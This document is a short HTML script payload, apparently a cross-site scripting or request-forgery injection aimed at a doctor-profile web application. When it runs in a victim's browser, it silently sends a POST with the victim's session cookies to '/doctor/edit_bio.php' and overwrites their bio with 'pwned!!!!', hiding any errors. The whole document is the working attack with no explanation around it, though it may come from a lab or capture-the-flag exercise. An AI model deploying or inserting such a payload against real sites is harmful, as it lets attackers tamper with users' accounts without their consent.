<script>
(async function(){
  try {
    await fetch('/doctor/edit_bio.php', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'bio=' + encodeURIComponent('pwned!!!!')
    });
  } catch(e){}
})();
</script>